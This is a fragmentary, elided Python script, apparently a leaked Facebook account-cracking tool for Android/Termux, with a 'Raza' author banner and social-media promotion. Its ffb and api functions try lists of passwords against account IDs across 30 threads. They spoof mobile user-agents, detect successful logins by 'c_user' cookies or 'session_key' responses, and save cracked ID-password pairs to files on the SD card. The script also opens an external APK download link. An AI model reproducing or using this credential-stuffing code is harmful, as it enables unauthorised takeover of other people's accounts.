#LEAKED BY : Ali Raza XD

#AKING TATA LATEST SC 
...
----------------------------------------------
 ...
 Facebook  : Ali Raza XD

 Github       : Mahummad-Ayaan-4
...
def public():
        ...
        try:
                ...
                with tred(max_workers=30) as crack_submit:
                        ...
                        print("\033[1;37m \x1b[38;5;208mUse Airplane ✈️ mode for speed up\033[1;37m")
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system(f'xdg-open https://chat.whatsapp.com/EI8nrph9N6jFoVFOSSj7jo');menu()

                        elif xd in ['7','07']:

                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/Ali_VPN1.0.apk/file');menu()
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;37m [RAZA-TRICKS] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in SHAZAD:
                                ...
                                print('\r\r\033[1;32m [RAZA-OK] %s | %s'%(ids,pas))

                                open('/sdcard/RAZA-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                ...
                                if 'y' in pcp:
                                        ...
                                        print('\r\r\x1b[38;5;208m [RAZA-CP] '+ids+' | '+pas+'\033[1;97m')

                                        open('/sdcard/RAZA-CP.txt', 'a').write(ids+'|'+pas+'\n')
...
def api(ids,names,passlist):
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N971N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36',}
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\r\033[1;32m [RAZA-OK] '+ids+' | '+pas+'\033[1;97m')
                                        ...
                                        if 'y' in pcp:
                                                ...
                                                print('\r\r\x1b[38;5;208m [RAZA-OK] '+ids+' | '+pas+'\033[1;97m')
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36',}
                                ...
                                if 'session_key' in q:
                                        ...
                                        try:
                                                ...
                                                okk=open('/sdcard/RAZA-OK.txt','r').read()

                                                if uid in okk:pass

                                                else:

                                                        print('\r\r\033[1;32m [RAZA-OK] '+uid+' | '+pas+'\033[1;97m')

                                                        open('/sdcard/RAZA-OK.txt','a').write(uid+'|'+pas+'\n')
